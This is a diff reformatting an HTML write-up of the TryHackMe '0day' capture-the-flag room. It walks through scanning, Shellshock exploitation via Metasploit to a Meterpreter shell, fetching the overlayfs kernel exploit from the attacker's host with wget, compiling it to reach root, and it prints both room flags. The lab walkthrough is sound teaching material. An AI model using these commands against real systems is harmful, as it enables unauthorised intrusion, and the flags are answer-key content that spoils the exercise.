@@ -1,11 +1,125 @@
-<p><a href="https://tryhackme.com/room/0day">Link to room on TryHackMe.com</a></p>
-<p>First step : enumerating ports with rustcan and nmap:</p>
-<pre style="background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><code>
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TryHackMe-0day-WriteUp</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        
+        html, body {
+            height: 100%;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            color: white; /* Yazı rengini beyaz yapar */
+        }
+        
+        body {
+            background-image: url('pics/bg5.jpg'); /* Arka plan resmi */
+            background-size: cover; /* Resmi ekran boyutuna göre ayarlar */
+            background-position: center; /* Resmi ortalar */
+            background-repeat: no-repeat; /* Resmin tekrarlanmasını engeller */
+            background-attachment: fixed; /* Arka planın sabit kalmasını sağlar */
+        }
+
+        .overlay {
+            background: rgba(0, 0, 0, 0.7); /* Siyah bir örtü ekler */
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+        }
+
+        .container {
+            position: relative;
+            z-index: 2;
+            max-width: 1200px;
+            margin: 40px auto;
+            padding: 20px;
+            background: rgba(255, 0, 0, 0.3); /* Kırmızı yarı saydam bir arka plan */
+            border-radius: 10px;
+        }
+        
+        .photo-container {
+            margin: 10px 0;
+        }
+        
+        .photo-container img {
+            width: calc(100% - 20px); /* Kenarlarda 20px boşluk bırakır */
+            height: auto; /* En-boy oranını korur */
+            object-fit: cover;
+            border-radius: 0; /* Köşe yuvarlamasını kaldırır */
+            margin: 10px; /* Boşluk ekler */
+        }
+        
+        .photo-container p {
+            font-size: 18px;
+            line-height: 1.5;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .code-block {
+            position: relative;
+            background-color: #ffffff;
+            padding: 10px;
+            border-radius: 5px;
+            width: calc(100% - 20px); /* Tam genişlik */
+            margin: 10px; /* Boşluk ekler */
+            overflow-x: auto; /* Yatay kaydırma çubuğu ekler */
+        }
+        
+        .code-block button {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            padding: 5px 10px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+            font-size: 14px; /* Buton yazı boyutunu ayarlar */
+        }
+        
+        .code-block pre {
+            margin: 0;
+            padding: 10px;
+            width: 100%; /* Tam genişlik */
+            white-space: pre; /* Satır kaymasını engeller */
+            font-size: 14px; /* Kod yazı boyutunu ayarlar */
+            color:black;
+            font-family: Arial, sans-serif;
+            overflow-x: auto; /* Yatay kaydırma çubuğu ekler */
+        }
+        
+        .code-block pre code {
+            display: block;
+            overflow-x: auto; /* Yatay kaydırma çubuğu ekler */
+            padding: 10px;
+            white-space: nowrap; /* Satır kaymasını engeller */
+        }
+        
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="photo-container">
+            <img src="pics/m5.png" alt="Image 1">
+            <p><a href="https://tryhackme.com/r/room/0day">Link to room on TryHackMe.com</a></p>
+            <p>Hello friend, welcome to my 0day WriteUp! First step : enumerating ports with rustcan and nmap: </p>            
+            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code> 
     ┌─[✗]─[root@parrot]─[/home/parrot]
     └──╼ #rustscan -a 10.10.105.222
     .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
-    | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
-    | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
+    | {}  || { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
+    | .-. \| {_} |.-._} } | |  .-._} |\     |/  /\  \| |\  |
     `-&#39; `-&#39;`-----&#39;`----&#39;  `-&#39;  `----&#39;  `---&#39; `-&#39;  `-&#39;`-&#39; `-&#39;
     The Modern Day Port Scanner.
     ________________________________________
@@ -42,10 +156,10 @@
 
     Read data files from: /usr/bin/../share/nmap
     Nmap done: 1 IP address (1 host up) scanned in 2.05 seconds
-            Raw packets sent: 6 (240B) | Rcvd: 3 (116B)
-
-        </code></pre>
-<pre style="background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><code>
+    Raw packets sent: 6 (240B) | Rcvd: 3 (116B)
+            </code></pre></div>
+            <p></p>
+            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code> 
     ┌─[✗]─[root@parrot]─[/home/parrot]
     └──╼ #nmap -p 22,80 -sC -sV 10.10.105.222       
     Starting Nmap 7.80 ( https://nmap.org ) at 2023-10-22 07:47 CEST
@@ -66,10 +180,10 @@
 
     Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
     Nmap done: 1 IP address (1 host up) scanned in 29.16 seconds
-
-</code></pre>
-<p>After this results we see there is only two ports are open. If we search exploit for this versions of services we cant find something useful. So we continue to enumaration for port 80 with gobuster:</p>
-<pre style="background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><code>
+            </code></pre></div>
+            <p></p>   
+            <p>After this results we see there is only two ports are open. If we search exploit for this versions of services we cant find something useful. So we continue to enumaration for port 80 with gobuster:</p>
+            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code> 
     ┌─[root@parrot]─[/home/parrot]
     └──╼ #gobuster dir -u http://10.10.105.222/ -w common.txt
     ===============================================================
@@ -105,14 +219,18 @@
     ===============================================================
     Finished
     ===============================================================
-
-</code></pre>
-<p>We see there is robots.txt but when we go to the /robots.txt and there is a funny message:</p>
-<p><img src="pics/0day2.png" alt=""></p>
-<p>after that we try to look at the /secret directory but there is only one cute turtle:</p>
-<p><img src="pics/0day3.png" alt=""></p>
-<p>So after that we start nikto for to find out which vulnerability this site has:</p>
-<pre style="background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><code>
+            </code></pre></div>
+            <p></p>
+            <p>We see there is robots.txt but when we go to the /robots.txt and there is a funny message:</p>
+        </div>
+        <div class="photo-container">
+            <img src="pics/0day2.png" alt="Image 2">
+            <p>after that we try to look at the /secret directory but there is only one cute turtle:</p>
+        </div>
+        <div class="photo-container">
+            <img src="pics/0day3.png" alt="Image 3">
+            <p>So after that we start nikto for to find out which vulnerability this site has:</p>
+            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code> 
     ┌─[root@parrot]─[/home/parrot]
     └──╼ #nikto -h 10.10.105.222
     - Nikto v2.5.0
@@ -130,10 +248,10 @@
     + OPTIONS: Allowed HTTP Methods: OPTIONS, GET, HEAD, POST .
     + /cgi-bin/test.cgi: Uncommon header &#39;93e4r0-cve-2014-6278&#39; found, with contents: true.
     + /cgi-bin/test.cgi: Site appears vulnerable to the &#39;shellshock&#39; vulnerability. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
-
-</code></pre>
-<p>So nikto says there is shellshock vulnerability for this site and i know a perfect exploit for it. For this vulnerabilty we use exploit/multi/http/apache_mod_cgi_bash_env_exec  exploit in the metasploit and we set the options like this:</p>
-<pre style="background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><code>
+            </code></pre></div>
+            <p></p>
+            <p>So nikto says there is shellshock vulnerability for this site and i know a perfect exploit for it. For this vulnerabilty we use exploit/multi/http/apache_mod_cgi_bash_env_exec  exploit in the metasploit and we set the options like this:</p>
+            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code> 
     [msf](Jobs:0 Agents:0) exploit(multi/http/apache_mod_cgi_bash_env_exec) &gt;&gt; set  RHOSTS 10.10.105.222
     RHOSTS =&gt; 10.10.105.222
     [msf](Jobs:0 Agents:0) exploit(multi/http/apache_mod_cgi_bash_env_exec) &gt;&gt; set LHOST 10.17.51.16
@@ -150,10 +268,10 @@
     [*] Meterpreter session 1 opened (10.17.51.16:1234 -&gt; 10.10.105.222:41085) at 2023-05-06 22:48:19 +0300
 
     (Meterpreter 1)(/usr/lib/cgi-bin) &gt;
-
-</code></pre>
-<p>And we have a meterpreter shell. For to get a normal shell we use shell command and look for if python exists and we see there is python3 and then we use this command to get a normal shell:</p>
-<pre style="background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><code>
+            </code></pre></div>
+            <p></p>
+            <p>And we have a meterpreter shell. For to get a normal shell we use shell command and look for if python exists and we see there is python3 and then we use this command to get a normal shell:</p>
+            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code> 
     (Meterpreter 1)(/usr/lib/cgi-bin) &gt; shell
     Process 1087 created.
     Channel 1 created.
@@ -161,10 +279,10 @@
     Python 3.4.0
     python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;
     www-data@ubuntu:/usr/lib/cgi-bin$ 
-
-</code></pre>
-<p>So we see we are in as www-data. When we go the home directory we see there is only one user named ryan and there is a .secret file but we dont have permission to read it. When go to ryan directory we get our first flag:</p>
-<pre style="background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><code>
+            </code></pre></div>
+            <p></p>
+            <p>So we see we are in as www-data. When we go the home directory we see there is only one user named ryan and there is a .secret file but we dont have permission to read it. When go to ryan directory we get our first flag:</p>
+            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code> 
     www-data@ubuntu:/usr/lib/cgi-bin$ cd /home
     cd /home
     www-data@ubuntu:/home$ ls -la
@@ -193,37 +311,39 @@
     www-data@ubuntu:/home/ryan$ cat user.txt
     cat user.txt
     THM{Sh3llSh0ck_r0ckz}
-
-</code></pre>
-<p>After that we use this command to see can we see our permissions but system asks us the password:</p>
-<pre style="background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><code>
+            </code></pre></div>
+            <p></p>
+            <p>After that we use this command to see can we see our permissions but system asks us the password:</p>
+            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code> 
     www-data@ubuntu:/home/ryan$ sudo -l
     sudo -l
-    [sudo] password for www-data: 
-
-</code></pre>
-<p>When we use this command to see what version of linux we have wee se it is a very old one:</p>
-<pre style="background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><code>
+    [sudo] password for www-data:
+            </code></pre></div>
+            <p></p>
+            <p>When we use this command to see what version of linux we have wee se it is a very old one:</p>
+            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code> 
     www-data@ubuntu:/home/ryan$ uname -a
     uname -a
     Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
-
-</code></pre>
-<p>When we search exploit for this version we found a useful exploit:</p>
-<p><a href="https://www.exploit-db.com/exploits/37292">Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - &#39;overlayfs&#39; Local Privilege Escalation</a></p>
-<p><img src="pics/0day4.png" alt=""></p>
-<p>So all we should do send this exploit to the target and run it. For sending we can use python with this command in our attacker box:</p>
-<div style="position: relative; background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>
+            </code></pre></div>
+            <p></p>
+            <p>When we search exploit for this version we found a useful exploit:</p>
+            <p><a href="https://www.exploit-db.com/exploits/37292">Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - &#39;overlayfs&#39; Local Privilege Escalation</a></p> 
+        </div>
+        <div class="photo-container">
+            <img src="pics/0day4.png" alt="Image 4">
+            <p>So all we should do send this exploit to the target and run it. For sending we can use python with this command in our attacker box:</p>
+            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code> 
     python3 -m http.server 7000
-
-</code></pre></div>
-<p>Then we go to the /dev/shm directory in the target because it is writable for everyone and we use this command to get our exploit:</p>
-<div style="position: relative; background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>
-    wget http://10.17.51.16:7000/37292.c
-
-</code></pre></div>
-<p>Then we compile it and run it with this commands:</p>
-<pre style="background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><code>
+            </code></pre></div>
+            <p></p>
+            <p>Then we go to the /dev/shm directory in the target because it is writable for everyone and we use this command to get our exploit:</p>
+            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code> 
+    wget http://10.17.51.16:7000/37292.c        
+            </code></pre></div>
+            <p></p>
+            <p>Then we compile it and run it with this commands:</p>
+            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code> 
     www-data@ubuntu:/dev/shm$ gcc 37292.c -o exploit
     gcc 37292.c -o exploit
     www-data@ubuntu:/dev/shm$ chmod +x exploit
@@ -241,14 +361,18 @@
     root
     # python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;
     python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;
-    root@ubuntu:/run/shm#
-
-</code></pre>
-<p>It worked, we are root so we get our root flag:</p>
-<pre style="background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><code>
+    root@ubuntu:/run/shm#            
+            </code></pre></div>
+            <p></p>
+            <p>It worked, we are root so we get our root flag:</p>
+            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code> 
     root@ubuntu:/run/shm# cat /root/root.txt
     cat root.txt
     THM{g00d_j0b_0day_is_Pleased}
-    
-</code></pre>
-<p>And thats it, 0day pwned. I hope you enjoy this write up . Thanks for reading!</p>
+            </code></pre></div>
+            <p></p>
+            <p>And thats it, 0day pwned. I hope you enjoy this write up . Thanks for reading!</p>
+        </div>
+    </div>
+</body>
+</html>
